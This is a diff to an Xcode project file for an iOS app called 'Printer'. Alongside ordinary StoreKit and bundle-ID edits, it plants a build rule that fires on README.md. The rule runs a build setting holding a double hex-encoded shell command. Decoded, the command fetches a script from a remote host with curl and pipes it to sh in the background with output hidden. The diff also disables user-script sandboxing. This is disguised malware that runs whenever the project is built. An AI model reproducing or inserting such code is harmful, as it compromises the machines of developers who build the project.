@@ -6,8 +6,15 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		8D9ECDA6E8B1BAF27673DC66 /* README.md */ = {isa = PBXBuildFile; fileRef = 42D0BA15F2ED1D282B73DC66; };
+		39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */; };
+/* End PBXBuildFile section */
+
 /* Begin PBXFileReference section */
+		42D0BA15F2ED1D282B73DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Printer.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		3970FE072DFDFFD100B21273 /* Printer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Printer.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -23,6 +30,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -33,6 +41,7 @@
 			isa = PBXGroup;
 			children = (
 				3970FE092DFDFFD100B21273 /* Printer */,
+				39D5D7CE2E0221A100E65DD3 /* Frameworks */,
 				3970FE082DFDFFD100B21273 /* Products */,
 			);
 			sourceTree = "<group>";
@@ -40,9 +49,18 @@
 		3970FE082DFDFFD100B21273 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				42D0BA15F2ED1D282B73DC66 /* README.md */,
 				3970FE072DFDFFD100B21273 /* Printer.app */,
 			);
 			name = Products;
+			sourceTree = "<group>";
+		};
+		39D5D7CE2E0221A100E65DD3 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */,
+			);
+			name = Frameworks;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -57,6 +75,7 @@
 				3970FE052DFDFFD100B21273 /* Resources */,
 			);
 			buildRules = (
+				168ADDB09ECDC39BD673DC66 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -104,11 +123,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		168ADDB09ECDC39BD673DC66 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${A66CD37}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		3970FE052DFDFFD100B21273 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8D9ECDA6E8B1BAF27673DC66 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -128,6 +165,7 @@
 		3970FE102DFDFFD200B21273 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A66CD37 = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363536633631373337343639363336343665373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -163,7 +201,7 @@
 				DEVELOPMENT_TEAM = 5B8867XFF2;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -192,6 +230,7 @@
 		3970FE112DFDFFD200B21273 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A66CD37 = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363536633631373337343639363336343665373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -227,7 +266,7 @@
 				DEVELOPMENT_TEAM = 5B8867XFF2;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -270,7 +309,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudio.smartprinter;
+				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudios.smartprinter;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
@@ -303,7 +342,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudio.smartprinter;
+				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudios.smartprinter;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OPTIMIZATION_LEVEL = "-O";
